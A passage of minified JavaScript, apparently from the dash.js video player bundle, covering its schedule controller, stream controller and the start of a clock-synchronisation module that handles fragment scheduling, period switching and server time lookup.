Fa=qa.getBufferLevel(),tb=oa.getAbandonmentStateFor(la),Eb=!fa.isCurrentTrack($a.mediaInfo)&&fa.getSwitchMode($a.mediaInfo.type)===J.default.TRACK_SWITCH_MODE_NEVER_REPLACE,Sa=$a.quality<Ca.quality;Ka&&(Eb||Sa)&&ua<=Fa&&tb!==l.default.ABANDON_LOAD?(Ta.push($a),Ab=!0,za.debug("Reloading outdated fragment at index: ",$a.index)):$a.quality>Ca.quality&&!ib&&(Ya=ba.getTime()+Fa)}}(),db=0<Ta.length,ib||isNaN(eb)||qb||db||function($a,ua){Pa[ua]=Pa[ua]||{};var Ka=oa.getTopQualityIndexFor($a,ua);return Pa[ua][$a]!=Ka&&(za.info("Top quality "+$a+" index has changed from "+Pa[ua][$a]+" to "+Ka),Pa[ua][$a]=Ka,1)}(la,ka)||bb.execute(la,Ca,hb)?(w(!0),!db&&Db&&oa.checkPlaybackQuality(la),Db=Ca.quality===eb&&!qb||ib?(Za=Ta.shift())&&Za.isInitializationRequest()?(T.trigger(r.default.INIT_FRAGMENT_NEEDED,{sender:xa,streamId:ka,mediaType:la,representationId:Za.representationId}),!1):(T.trigger(r.default.MEDIA_FRAGMENT_NEEDED,{sender:xa,streamId:ka,mediaType:la,seekTarget:Ya,replacement:Za}),!0):(qb?(za.debug("Switch track for "+la+", representation id = "+Ca.id),(ib=fa.getSwitchMode(la)===J.default.TRACK_SWITCH_MODE_ALWAYS_REPLACE)&&qa.replaceBuffer&&qa.replaceBuffer(),qb=!1):za.debug("Quality has changed, get init request for representationid = "+Ca.id),T.trigger(r.default.INIT_FRAGMENT_NEEDED,{sender:xa,streamId:ka,mediaType:la,representationId:Ca.id}),eb=Ca.quality,!1)):N(500))}function N(db){clearTimeout(La),La=setTimeout(G,db)}function w(db){Ga!==db?Ga=db:za.debug("isFragmentProcessingInProgress is already equal to",db)}function h(db){var Za;ba&&V&&(Za=V.getRequests({state:g.default.FRAGMENT_MODEL_EXECUTED,time:ba.getTime(),threshold:0})[0])&&ba.getTime()>=Za.startTime&&((!Da.mediaInfo||Za.mediaInfo.type===Da.mediaInfo.type&&Za.mediaInfo.id!==Da.mediaInfo.id)&&db&&T.trigger(r.default.TRACK_CHANGE_RENDERED,{mediaType:la,oldMediaInfo:Da.mediaInfo,newMediaInfo:Za.mediaInfo}),Za.quality===Da.quality&&Za.adaptationIndex===Da.adaptationIndex||!db||T.trigger(r.default.QUALITY_CHANGE_RENDERED,{mediaType:la,oldQuality:Da.quality,newQuality:Za.quality}),Da={mediaInfo:Za.mediaInfo,quality:Za.quality,adaptationIndex:Za.adaptationIndex})}function F(db){db.request.mediaInfo.streamInfo.id===ka&&db.request.mediaType===la&&(L(),w(!1),za.info("Stream is complete"))}function P(db){db.request.mediaInfo.streamInfo.id===ka&&db.request.mediaType===la&&(za.info("OnFragmentLoadingCompleted - Url:",db.request?db.request.url:"undefined",db.request.range?", Range:"+db.request.range:""),pa.getIsTextTrack(C)&&w(!1),db.error&&db.request.serviceLocation&&!Ba&&(Ta.push(db.request),w(!1),N(0)),ib&&(mb=db.request))}function O(){h(!0)}function R(db){var Za,$a,ua;db.streamId===ka&&db.mediaType===la&&(ib&&!isNaN(db.startTime)&&(ib=!1,V.addExecutedRequest(mb)),w(!1),Ab&&!isNaN(db.startTime)?(Za=ba.getTime(),N(($a=db.startTime+Ca.fragmentDuration)<=Za+(ua=1.5*Ca.fragmentDuration)?0:1e3*($a-(Za+ua))),Ab=!1):N(0))}function Q(db){db.streamId===ka&&db.mediaType===la&&(za.info("onFragmentLoadingAbandoned request: "+db.request.url+" has been aborted"),ba.isSeeking()||qb||(za.info("onFragmentLoadingAbandoned request: "+db.request.url+" has to be downloaded again, origin is not seeking process or switch track call"),Ta.push(db.request)),w(!1),N(0))}function ja(db){db.sender.getType()===la&&db.sender.getStreamId()}function W(db){la===db.mediaType&&ka===db.streamId&&L()}function aa(db){db.streamId===ka&&db.mediaType===la&&db.hasEnoughSpaceToAppend&&db.quotaExceeded&&Ba&&I()}function ma(db){db.streamId===ka&&db.mediaType===la&&(L(),w(!1))}function H(){V.abortRequests(),L()}function B(){!Ba&&va.get().streaming.scheduleWhilePaused||I()}function A(db){Ya=db.seekTime,Ra=0,Ba&&I(),db=Ca.DVRWindow&&ba?Ca.DVRWindow.end-ba.getTime():NaN,ia.updateManifestUpdateInfo({latency:db}),Ga?(za.debug("Abort requests"),V.abortRequests()):N(0)}function Y(db){ia.updatePlayListTraceMetrics({playbackspeed:db.playbackRate.toString()})}function Z(){Da={mediaInfo:void(Ra=0),quality:eb=Ya=NaN,adaptationIndex:NaN},Pa={},Ta=[],Ab=ib=qb=!(Ba=!(Ga=!(Db=!(mb=null))))}E=E||{};var na=this.context,T=(0,t.default)(na).getInstance(),pa=E.adapter,ia=E.dashMetrics,S=E.mediaPlayerModel,V=E.fragmentModel,oa=E.abrController,ba=E.playbackController,ha=E.textController,ka=E.streamId,la=E.type,C=E.mimeType,fa=E.mediaController,qa=E.bufferController,va=E.settings,xa=void 0,za=void 0,Ca=void 0,Ba=void 0,Ga=void 0,Ra=void 0,La=void 0,Ya=void 0,hb=void 0,bb=void 0,Da=void 0,Pa=void 0,eb=void 0,Ta=void 0,qb=void 0,ib=void 0,mb=void 0,Db=void 0,Ab=void 0;return xa={initialize:function(db){hb=db,bb=(0,f.default)(na).create({abrController:oa,dashMetrics:ia,mediaPlayerModel:S,textController:ha,settings:va}),T.on(r.default.DATA_UPDATE_STARTED,ja,this),T.on(r.default.FRAGMENT_LOADING_COMPLETED,P,this),T.on(r.default.STREAM_COMPLETED,F,this),T.on(r.default.BUFFER_CLEARED,aa,this),T.on(r.default.BYTES_APPENDED_END_FRAGMENT,R,this),T.on(r.default.QUOTA_EXCEEDED,ma,this),T.on(r.default.PLAYBACK_SEEKING,A,this),T.on(r.default.PLAYBACK_STARTED,B,this),T.on(r.default.PLAYBACK_RATE_CHANGED,Y,this),T.on(r.default.PLAYBACK_TIME_UPDATED,O,this),T.on(r.default.URL_RESOLUTION_FAILED,H,this),T.on(r.default.FRAGMENT_LOADING_ABANDONED,Q,this),T.on(r.default.BUFFERING_COMPLETED,W,this)},getType:function(){return la},getStreamId:function(){return ka},setCurrentRepresentation:function(db){Ca=db},setSeekTarget:function(db){Ya=db},setTimeToLoadDelay:function(db){Ra=db},getTimeToLoadDelay:function(){return Ra},switchTrackAsked:function(){qb=!0},isStarted:D,start:I,stop:L,reset:function(){T.off(r.default.DATA_UPDATE_STARTED,ja,this),T.off(r.default.FRAGMENT_LOADING_COMPLETED,P,this),T.off(r.default.STREAM_COMPLETED,F,this),T.off(r.default.BUFFER_CLEARED,aa,this),T.off(r.default.BYTES_APPENDED_END_FRAGMENT,R,this),T.off(r.default.QUOTA_EXCEEDED,ma,this),T.off(r.default.PLAYBACK_SEEKING,A,this),T.off(r.default.PLAYBACK_STARTED,B,this),T.off(r.default.PLAYBACK_RATE_CHANGED,Y,this),T.off(r.default.PLAYBACK_TIME_UPDATED,O,this),T.off(r.default.URL_RESOLUTION_FAILED,H,this),T.off(r.default.FRAGMENT_LOADING_ABANDONED,Q,this),T.off(r.default.BUFFERING_COMPLETED,W,this),L(),h(!1),Z()},getBufferTarget:function(){return bb.getBufferTarget(la,Ca,hb)},processInitRequest:function(db){db&&(w(!0),V.executeRequest(db))},processMediaRequest:function(db){db?(za.debug("Next fragment request url is "+db.url),V.executeRequest(db)):(ba.getIsDynamic()&&za.debug("Next fragment seems to be at the bleeding live edge and is not available yet. Rescheduling."),w(!1),N(va.get().streaming.lowLatencyEnabled?100:500))}},za=(0,z.default)(na).getInstance().getLogger(xa),Z(),xa}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(109)),f=v(u(196)),g=v(u(149)),t=v(u(46)),r=v(u(54)),x=v(u(47)),z=v(u(45)),J=v(u(117));m.__dashjs_factory_name="ScheduleController",M.default=x.default.getClassFactory(m),da.exports=M.default},{108:108,109:109,117:117,149:149,196:196,45:45,46:46,47:47,54:54}],121:[function(u,da,M){function v(F){return F&&F.__esModule?F:{default:F}}function m(){function F(){var ab;!ba()||(ab=Vb.getPlaybackQuality())&&eb.addDroppedFrames(ab)}function P(){if(!(!cc.get().streaming.jumpGaps||0===A()||Zb.isSeeking()||pc||nb||Bb||Ib)&&40<=++Sb){var ab=Zb.getTime();if(xc===ab){for(var Fb=A(),Wb=cc.get().streaming.smallGapLimit,Ia=void 0,vb=0;vb<Fb.length;vb++){var Hb=Fb[vb].getBuffer().getAllBufferRanges(),wc=void 0;if(Hb&&!(1>=Hb.length)){for(var Lc,Fc=0;Fc<Hb.length;Fc++)if(ab<Hb.start(Fc)){wc=Hb.start(Fc);break}0<wc&&0<(Lc=wc-ab)&&Lc<=Wb&&(void 0===Ia||Ia<wc)&&(Ia=wc)}}Fb=Zb.getTimeToStreamEnd(),void 0===Ia&&!isNaN(Fb)&&Fb<Wb&&(Ia=ab+Fb),0<Ia&&(!isNaN(Fb)&&ab+Fb<=Ia?(La.info("Jumping media gap (discontinuity) at time ",ab,". Jumping to end of the stream"),Ga.trigger(r.default.PLAYBACK_ENDED,{isLast:fa().isLast})):(La.info("Jumping media gap (discontinuity) at time ",ab,". Jumping to time position",Ia),Zb.seek(Ia,!0,!0)))}else xc=ab;Sb=0}}function O(ab){var Fb=B(ab.seekTime);lb&&(ja(),ob=!1),Kb&&(La.debug("[PreloadTimer] stop period preload timer."),clearTimeout(Kb),Kb=void 0),Fb===tb&&hc&&hc.deactivate(!0),Fb&&(Fb!==tb||hc&&!tb.isActive())?(ka(z.PlayListTrace.END_OF_PERIOD_STOP_REASON),na(Fb,tb,ab.seekTime)):ka(z.PlayListTrace.USER_REQUEST_STOP_REASON),la(z.PlayList.SEEK_START_REASON)}function R(){La.debug("[onPlaybackStarted]"),Xa?(Xa=!1,la(z.PlayList.INITIAL_PLAYOUT_START_REASON)):pc&&(pc=!1,la(z.PlayList.RESUME_FROM_PAUSE_START_REASON),W())}function Q(ab){La.debug("[onPlaybackPaused]"),ab.ended||(pc=!0,ka(z.PlayListTrace.USER_REQUEST_STOP_REASON),W())}function ja(){La.debug("[toggleEndPeriodTimer] stop end period timer."),clearTimeout(lb),lb=void 0}function W(){var ab,Fb,Wb;ob&&(lb?ja():(Wb=2e3>(Fb=0<(ab=Zb.getTimeToStreamEnd())?1e3*ab:0)?Fb/4:Fb-2e3,La.debug("[toggleEndPeriodTimer] Going to fire preload in",Wb,"milliseconds"),Kb=setTimeout(H,Wb),La.debug("[toggleEndPeriodTimer] start-up of timer to notify PLAYBACK_ENDED event. It will be triggered in",Fb,"milliseconds"),lb=setTimeout((function(){Ga.trigger(r.default.PLAYBACK_ENDED,{isLast:fa().isLast})}),Fb)))}function aa(ab){var Fb;ab.mediaType!==p.default.AUDIO&&ab.mediaType!==p.default.VIDEO||(Fb=fa().isLast,Qb&&!Fb&&void 0===lb&&(La.info("[onTrackBufferingCompleted] end of period detected. Track",ab.mediaType,"has finished"),!(ob=!0)===pc&&W()))}function ma(){var ab=fa().isLast;Qb&&ab&&(La.info("[onStreamBufferingCompleted] calls signalEndOfStream of mediaSourceController."),Ta.signalEndOfStream(Qb))}function H(){var ab,Fb=fa().isLast;Qb&&!Fb&&(ab=Z(),tb.isProtectionCompatible(ab)&&(kc||tb.isMediaCodecCompatible(ab))&&(La.info("[onStreamCanLoadNext] Preloading next stream"),tb.deactivate(!0),ab.preload(Qb,ac),(hc=ab).getProcessors().forEach((function(Wb){Wb.setIndexHandlerTime(ab.getStartTime())}))))}function B(ab){var Fb=0,Wb=null,Ia=Fa.length;0<Ia&&(Fb+=Fa[0].getStartTime());for(var vb=0;vb<Ia;vb++)if(Wb=Fa[vb],ab<(Fb=parseFloat((Fb+Wb.getDuration()).toFixed(5))))return Wb;return null}function A(){return tb?tb.getProcessors():[]}function Y(){var ab=Z();ab?na(ab,tb,NaN):La.debug("StreamController no next stream found"),ka(ab?z.PlayListTrace.END_OF_PERIOD_STOP_REASON:z.PlayListTrace.END_OF_CONTENT_STOP_REASON),lb=void 0,ob=!1}function Z(){if(tb){var ab=(Fb=fa().start,Wb=fa().duration,{v:Fa.filter((function(Ia){return Ia.getStreamInfo().start===parseFloat((Fb+Wb).toFixed(5))}))[0]});if("object"==typeof ab)return ab.v}var Fb,Wb}function na(ab,Fb,Wb){var Ia;La.info("Switch stream to "+ab.getId()+" at t="+Wb),nb||!ab||Fb===ab&&ab.isActive()||(nb=!0,Ga.trigger(r.default.PERIOD_SWITCH_STARTED,{fromStreamInfo:Fb?Fb.getStreamInfo():null,toStreamInfo:ab.getStreamInfo()}),Ia=!1,Fb&&(Ia=tb.isProtectionCompatible(ab)&&(kc||tb.isMediaCodecCompatible(ab))&&!Wb||ab.getPreloaded(),Fb.deactivate(Ia)),Wb=isNaN(Wb)?!Ia&&Fb?ab.getStreamInfo().start:NaN:Wb,tb=ab,hc=!1,Zb.initialize(fa(),!!Fb,Wb),Vb.getElement()?T(Wb,null===Fb,!1,Ia):pa(Wb,Ia))}function T(ab,Fb,Wb,Ia){function vb(){Qb&&"open"==Qb.readyState&&(La.debug("MediaSource is open!"),wa.URL.revokeObjectURL(Hb),Qb.removeEventListener("sourceopen",vb),Qb.removeEventListener("webkitsourceopen",vb),ia(),Fb||Ga.trigger(r.default.SOURCE_INITIALIZED),Wb?tb.setMediaSource(Qb):pa(ab,Ia))}var Hb=void 0;Qb?Ia?(pa(ab,Ia),Fb||Ga.trigger(r.default.SOURCE_INITIALIZED)):(Ta.detachMediaSource(Vb),Qb.addEventListener("sourceopen",vb,!1),Qb.addEventListener("webkitsourceopen",vb,!1),Hb=Ta.attachMediaSource(Qb,Vb),La.debug("MediaSource attached to element.  Waiting on open...")):((Qb=Ta.createMediaSource()).addEventListener("sourceopen",vb,!1),Qb.addEventListener("webkitsourceopen",vb,!1),Hb=Ta.attachMediaSource(Qb,Vb),La.debug("MediaSource attached to element.  Waiting on open..."))}function pa(ab,Fb){var Wb;!(ac=tb.activate(Qb,Fb?ac:void 0))||0<(Wb=Object.keys(ac)).length&&ac[Wb[0]].changeType&&(La.debug("SourceBuffer changeType method supported. Use it to switch codecs in periods transitions"),kc=!0),Xa||isNaN(ab)||Zb.seek(ab),!rb&&Xa||Zb.play(),nb=!1,Ga.trigger(r.default.PERIOD_SWITCH_COMPLETED,{toStreamInfo:fa()})}function ia(ab){ab=ab||fa().manifestInfo.duration,ab=Ta.setDuration(Qb,ab),La.debug("Duration successfully set to: "+ab)}function V(){var ab=Da.getValue();Eb&&(Ga.trigger(r.default.PROTECTION_CREATED,{controller:Eb,manifest:ab}),Eb.setMediaElement(Vb.getElement()),Sa&&Eb.setProtectionData(Sa)),function S(){try{var ab=Pa.getStreamsInfo();if(0===ab.length)throw Error("There are no streams");eb.updateManifestUpdateInfo({currentTime:Zb.getTime(),buffered:Vb.getBufferRange(),presentationStartTime:ab[0].start,clientTimeOffset:Ka.getClientTimeOffset()});for(var Fb,Wb,Ia,vb,Hb=0,wc=ab.length;Hb<wc;Hb++){var Lc=ab[Hb],Fc=function(dc){for(var Hc=0,Jb=Fa.length;Hc<Jb;Hc++)if(Fa[Hc].getId()===dc.id)return Fa[Hc];return null}(Lc);Fc?Fc.updateData(Lc):(Fc=(0,f.default)(Ba).create({manifestModel:Da,mediaPlayerModel:oc,dashMetrics:eb,manifestUpdater:hb,adapter:Pa,timelineConverter:Ka,capabilities:Ya,errHandler:ua,baseURLController:ib,abrController:mb,playbackController:Zb,eventController:Ab,mediaController:Db,textController:db,videoModel:Vb,settings:cc}),Fa.push(Fc),Fc.initialize(Lc,Eb)),eb.addManifestUpdateStreamInfo(Lc)}tb||(Pa.getIsDynamic()&&Fa.length&&(Wb=function(dc,Hc){try{var Jb=NaN;return Hc&&!isNaN(Hc.maxFragmentDuration)&&isFinite(Hc.maxFragmentDuration)?Hc.maxFragmentDuration:(dc&&1===dc.length&&(lc=dc[0],qc=[p.default.VIDEO,p.default.AUDIO,p.default.FRAGMENTED_TEXT].reduce((function(Dc,zc){return(zc=Pa.getMediaInfoForType(lc,zc))&&Dc.push(zc),Dc}),[]).reduce((function(Dc,zc){return(zc=Pa.getVoRepresentations(zc))&&0<zc.length&&zc.forEach((function(Ac){Ac&&Dc.push(Ac)})),Dc}),[]).reduce((function(Dc,zc){return(zc=Pa.convertDataToRepresentationInfo(zc))&&zc.fragmentDuration&&!isNaN(zc.fragmentDuration)&&Dc.push(zc.fragmentDuration),Dc}),[]),Jb=Math.max.apply(Math,function(Dc){if(Array.isArray(Dc)){for(var zc=0,Ac=Array(Dc.length);zc<Dc.length;zc++)Ac[zc]=Dc[zc];return Ac}return Array.from(Dc)}(qc))),isFinite(Jb)?Jb:NaN)}catch(lc){return NaN}var lc,qc}(ab,Fb=ab[0].manifestInfo),Zb.computeAndSetLiveDelay(Wb,Fb.DVRWindowSize,Fb.minBufferTime)),Ia=null,vb=Zb.getStartTimeFromUriParameters(ab[0].start,Pa.getIsDynamic()),isNaN(vb)||(Ia=B(vb)),!Ia&&Pa.getIsDynamic()&&Fa.length&&(La.debug("Dynamic stream: Trying to find the correct starting period"),Ia=function(){try{return B(Ka.calcPresentationTimeFromWallTime(new Date,Pa.getRegularPeriods()[0])-Zb.getLiveDelay())}catch(Jb){return null}}()),na(null!==Ia?Ia:Fa[0],null,NaN)),Ga.trigger(r.default.STREAMS_COMPOSED)}catch(dc){ua.error(new N.default(w.default.MANIFEST_ERROR_ID_NOSTREAMS_CODE,dc.message+"nostreamscomposed",Da.getValue())),Ib=!0,za()}}()}function oa(ab){ab.error?(Ib=!0,za()):function(){var Fb=ab.manifest;Pa.updatePeriods(Fb);var Wb=Pa.getStreamsInfo(void 0,1)[0],Ia=Pa.getMediaInfoForType(Wb,p.default.VIDEO)||Pa.getMediaInfoForType(Wb,p.default.AUDIO);Wb=void 0,Ia&&(Wb=Pa.getUseCalculatedLiveEdgeTimeForMediaInfo(Ia))&&(La.debug("SegmentTimeline detected using calculated Live Edge Time"),cc.update({streaming:{useManifestDateHeaderTimeSource:!1}})),Ia=Pa.getUTCTimingSources(),Wb=!Pa.getIsDynamic()||Wb?Ia:Ia.concat(oc.getUTCTimingSources());var vb=$a.isHTTPS(ab.manifest.url);Wb.forEach((function(Hb){Hb.value.replace(/.*?:\/\//g,"")===oc.getDefaultUtcTimingSource().value.replace(/.*?:\/\//g,"")&&(Hb.value=Hb.value.replace(vb?new RegExp(/^(http:)?\/\//i):new RegExp(/^(https:)?\/\//i),vb?"https://":"http://"),La.debug("Matching default timing source protocol to manifest protocol: ",Hb.value))})),ib.initialize(Fb),qb.setConfig({dashMetrics:eb,baseURLController:ib}),qb.initialize(Wb,cc.get().streaming.useManifestDateHeaderTimeSource)}()}function ba(){return!!tb&&tb.getHasVideoTrack()}function ha(){return!!tb&&tb.getHasAudioTrack()}function ka(ab,Fb){Fb=Fb||new Date,A().forEach((function(Wb){Wb.finalisePlayList(Fb,ab)})),eb.addPlayList()}function la(ab){eb.createPlaylistMetrics(1e3*Zb.getTime(),ab)}function C(ab){if(ab.error){switch(ab.error.code){case 1:var Fb="MEDIA_ERR_ABORTED";break;case 2:Fb="MEDIA_ERR_NETWORK";break;case 3:Fb="MEDIA_ERR_DECODE";break;case 4:Fb="MEDIA_ERR_SRC_NOT_SUPPORTED";break;case 5:Fb="MEDIA_ERR_ENCRYPTED";break;default:Fb="UNKNOWN"}Bb=!0,ab.error.message&&(Fb+=" ("+ab.error.message+")"),ab.error.msExtendedCode&&(Fb+=" (0x"+(ab.error.msExtendedCode>>>0).toString(16).toUpperCase()+")"),La.fatal("Video Element Error: "+Fb),ab.error&&La.fatal(ab.error),ua.error(new N.default(ab.error.code,Fb)),za()}}function fa(){return tb?tb.getStreamInfo():null}function qa(){if(!(bb&&bb.hasOwnProperty("load")&&Ka&&Ka.hasOwnProperty("initialize")&&Ka.hasOwnProperty("reset")&&Ka.hasOwnProperty("getClientTimeOffset")&&Da&&ua&&eb&&Zb))throw Error(p.default.MISSING_CONFIG_ERROR)}function va(ab){isNaN(ab.newDuration)||ia(ab.newDuration)}function xa(){tb=Eb=null,lb=void 0,ob=!(rb=!(pc=!(Xa=!(Ib=Bb=nb=!(Fa=[]))))),Sb=0}function za(){qa(),qb.reset(),ka(Bb||Ib?z.PlayListTrace.FAILURE_STOP_REASON:z.PlayListTrace.USER_REQUEST_STOP_REASON);for(var ab=0,Fb=Fa?Fa.length:0;ab<Fb;ab++)Fa[ab].reset(Bb);!function(){Ga.off(r.default.PLAYBACK_TIME_UPDATED,F,this),Ga.off(r.default.PLAYBACK_SEEKING,O,this),Ga.off(r.default.PLAYBACK_ERROR,C,this),Ga.off(r.default.PLAYBACK_STARTED,R,this),Ga.off(r.default.PLAYBACK_PAUSED,Q,this),Ga.off(r.default.PLAYBACK_ENDED,Y,this),Ga.off(r.default.MANIFEST_UPDATED,oa,this),Ga.off(r.default.BUFFERING_COMPLETED,aa,this),Ga.off(r.default.STREAM_BUFFERING_COMPLETED,ma,this),Ga.off(r.default.MANIFEST_VALIDITY_CHANGED,va,this),Ga.off(r.default.TIME_SYNCHRONIZATION_COMPLETED,V,this),Ga.off(r.default.WALLCLOCK_TIME_UPDATED,P,this),Ga.off(I.default.METRIC_ADDED,Ca,this)}(),ib.reset(),hb.reset(),Ab.reset(),eb.clearAllCurrentMetrics(),Da.setValue(null),bb.reset(),Ka.reset(),Za.reset(),Qb&&(Ta.detachMediaSource(Vb),Qb=null),Vb=null,Eb&&(Eb.setMediaElement(null),Sa=Eb=null,Da.getValue()&&Ga.trigger(r.default.PROTECTION_DESTROYED,{data:Da.getValue().url})),Ga.trigger(r.default.STREAM_TEARDOWN_COMPLETE),xa()}function Ca(ab){var Fb;ab.metric===l.default.DVR_INFO&&(Fb=ha()?p.default.AUDIO:p.default.VIDEO,ab.mediaType===Fb&&Ta.setSeekable(Qb,ab.value.range.start,ab.value.range.end))}var Ra,Ba=this.context,Ga=(0,t.default)(Ba).getInstance(),La=void 0,Ya=void 0,hb=void 0,bb=void 0,Da=void 0,Pa=void 0,eb=void 0,Ta=void 0,qb=void 0,ib=void 0,mb=void 0,Db=void 0,Ab=void 0,db=void 0,Za=void 0,$a=void 0,ua=void 0,Ka=void 0,Fa=void 0,tb=void 0,Eb=void 0,Sa=void 0,rb=void 0,nb=void 0,Bb=void 0,Ib=void 0,Qb=void 0,Vb=void 0,Zb=void 0,oc=void 0,pc=void 0,Xa=void 0,ob=void 0,lb=void 0,Kb=void 0,Sb=void 0,ac=void 0,hc=void 0,xc=void 0,kc=void 0,cc=void 0;return Ra={initialize:function(ab,Fb){qa(),rb=ab,Sa=Fb,Ka.initialize(),(hb=(0,g.default)(Ba).create()).setConfig({manifestModel:Da,adapter:Pa,manifestLoader:bb,errHandler:ua,settings:cc}),hb.initialize(),(Ab=(0,h.default)(Ba).getInstance()).setConfig({manifestUpdater:hb,playbackController:Zb}),Ab.start(),function(){Ga.on(r.default.PLAYBACK_TIME_UPDATED,F,this),Ga.on(r.default.PLAYBACK_SEEKING,O,this),Ga.on(r.default.PLAYBACK_ERROR,C,this),Ga.on(r.default.PLAYBACK_STARTED,R,this),Ga.on(r.default.PLAYBACK_PAUSED,Q,this),Ga.on(r.default.PLAYBACK_ENDED,Y,this),Ga.on(r.default.MANIFEST_UPDATED,oa,this),Ga.on(r.default.BUFFERING_COMPLETED,aa,this),Ga.on(r.default.STREAM_BUFFERING_COMPLETED,ma,this),Ga.on(r.default.MANIFEST_VALIDITY_CHANGED,va,this),Ga.on(r.default.TIME_SYNCHRONIZATION_COMPLETED,V,this),Ga.on(r.default.WALLCLOCK_TIME_UPDATED,P,this),Ga.on(I.default.METRIC_ADDED,Ca,this)}()},getActiveStreamInfo:fa,hasVideoTrack:ba,hasAudioTrack:ha,switchToVideoElement:function(ab){tb&&(Zb.initialize(fa()),T(ab,!1,!0,!1))},getStreamById:function(ab){return Fa.filter((function(Fb){return Fb.getId()===ab}))[0]},getStreamForTime:B,getTimeRelativeToStreamId:function(ab,Fb){for(var Hb,Wb=null,Ia=0,vb=0,wc=0;wc<Fa.length;wc++){if(vb=(Wb=Fa[wc]).getStartTime(),Hb=Wb.getDuration(),Number.isFinite(vb)&&(Ia=vb),Wb.getId()===Fb)return ab-Ia;Number.isFinite(Hb)&&(Ia+=Hb)}return null},load:function(ab){qa(),bb.load(ab)},loadWithManifest:function(ab){if(!hb||!hb.hasOwnProperty("setManifest"))throw Error("initialize function has to be called previously");hb.setManifest(ab)},getActiveStreamProcessors:A,setConfig:function(ab){ab&&(ab.capabilities&&(Ya=ab.capabilities),ab.manifestLoader&&(bb=ab.manifestLoader),ab.manifestModel&&(Da=ab.manifestModel),ab.mediaPlayerModel&&(oc=ab.mediaPlayerModel),ab.protectionController&&(Eb=ab.protectionController),ab.adapter&&(Pa=ab.adapter),ab.dashMetrics&&(eb=ab.dashMetrics),ab.errHandler&&(ua=ab.errHandler),ab.timelineConverter&&(Ka=ab.timelineConverter),ab.videoModel&&(Vb=ab.videoModel),ab.playbackController&&(Zb=ab.playbackController),ab.abrController&&(mb=ab.abrController),ab.mediaController&&(Db=ab.mediaController),ab.textController&&(db=ab.textController),ab.settings&&(cc=ab.settings),ab.baseURLController&&(ib=ab.baseURLController))},setProtectionData:function(ab){Sa=ab},reset:za},La=(0,J.default)(Ba).getInstance().getLogger(Ra),qb=(0,L.default)(Ba).getInstance(),Ta=(0,G.default)(Ba).getInstance(),Za=(0,E.default)(Ba).getInstance(),$a=(0,D.default)(Ba).getInstance(),xa(),Ra}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(109)),f=v(u(105)),g=v(u(99)),t=v(u(46)),r=v(u(54)),x=v(u(47)),z=u(243),J=v(u(45)),E=v(u(213)),D=v(u(220)),I=v(u(101)),L=v(u(122)),G=v(u(118)),N=v(u(225)),w=v(u(51)),h=v(u(115));m.__dashjs_factory_name="StreamController",M.default=x.default.getSingletonFactory(m),da.exports=M.default},{101:101,105:105,108:108,109:109,115:115,118:118,122:122,213:213,220:220,225:225,243:243,45:45,46:46,47:47,51:51,54:54,99:99}],122:[function(u,da,M){function v(J){return J&&J.__esModule?J:{default:J}}function m(){function J(B){var A,Y,Z,na=Date.parse(B);return isNaN(na)&&(Z=/^([0-9]{4})-([0-9]{2})-([0-9]{2})T([0-9]{2}):([0-9]{2})(?::([0-9]*)(\.[0-9]*)?)?(?:([+\-])([0-9]{2})([0-9]{2}))?/.exec(B),A=Date.UTC(parseInt(Z[1],10),parseInt(Z[2],10)-1,parseInt(Z[3],10),parseInt(Z[4],10),parseInt(Z[5],10),Z[6]&&(parseInt(Z[6],10)||0),Z[7]&&1e3*parseFloat(Z[7])||0),Z[9]&&Z[10]&&(Y=60*parseInt(Z[9],10)+parseInt(Z[10],10),A+=("+"===Z[8]?-1:1)*Y*6e4),na=new Date(A).getTime()),na}function E(B){return Date.parse(B)}function D(B){return Date.parse(B)}function I(B,A,Y){Y()}function L(B,A,Y){B=J(B),isNaN(B)?Y():A(B)}function G(B,A,Y,Z,na){var T,pa=!1,ia=new XMLHttpRequest,S=na?l.HTTPRequest.HEAD:l.HTTPRequest.GET,V=A.match(/\S+/g);A=V.shift(),!P.isRelative(A)||(T=H.resolve())&&(A=P.resolve(A,T.url)),ia.open(S,A),ia.timeout=5e3,ia.onload=function(){var oa=void 0,ba=void 0;200===ia.status&&(oa=na?ia.getResponseHeader("Date"):ia.response,ba=B(oa),isNaN(ba)||(Y(ba),pa=!0))},ia.onloadend=function(){pa||(pa=!0,V.length?G(B,V.join(" "),Y,Z,na):Z())},ia.send()}function N(B,A,Y){G(D,B,A,Y,!0)}function w(B,A,Y){ja=!1,F.trigger(g.default.TIME_SYNCHRONIZATION_COMPLETED,{time:A,offset:Y,error:B?new p.default(t.default.TIME_SYNC_FAILED_ERROR_CODE,t.default.TIME_SYNC_FAILED_ERROR_MESSAGE):null})}var O,h=this.context,F=(0,f.default)(h).getInstance(),P=(0,z.default)(h).getInstance(),R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 0,H=void 0;return O={initialize:function(B,A){W=A,Q=0,ja=!1,aa={"urn:mpeg:dash:utc:http-head:2014":N,"urn:mpeg:dash:utc:http-xsdate:2014":G.bind(null,J),"urn:mpeg:dash:utc:http-iso:2014":G.bind(null,E),"urn:mpeg:dash:utc:direct:2014":L,"urn:mpeg:dash:utc:http-head:2012":N,"urn:mpeg:dash:utc:http-xsdate:2012":G.bind(null,J),"urn:mpeg:dash:utc:http-iso:2012":G.bind(null,E),"urn:mpeg:dash:utc:direct:2012":L,"urn:mpeg:dash:utc:http-ntp:2014":I,"urn:mpeg:dash:utc:ntp:2014":I,"urn:mpeg:dash:utc:sntp:2014":I},ja||function T(Z,na){var pa=na||0;na=Z[pa];var ia=function(S,V){var oa=!S||!V;oa&&W?(S=null!==(S=ma.getLatestMPDRequestHeaderValueByID("Date"))?new Date(S).getTime():Number.NaN,isNaN(S)?w(!0):w(!1,S/1e3,Q=S-(new Date).getTime())):w(oa,S,V)};ja=!0,na?aa.hasOwnProperty(na.schemeIdUri)?aa[na.schemeIdUri](na.value,(function(S){var V=(new Date).getTime(),oa=S-V;Q=oa,R.info("Local time: "+new Date(V)),R.info("Server time: "+new Date(S)),R.info("Server Time - Local Time (ms): "+oa),ia(S,oa)}),(function(){T(Z,pa+1)})):T(Z,pa+1):(Q=0,ia())}(B)},getOffsetToDeviceTimeMs:function(){return 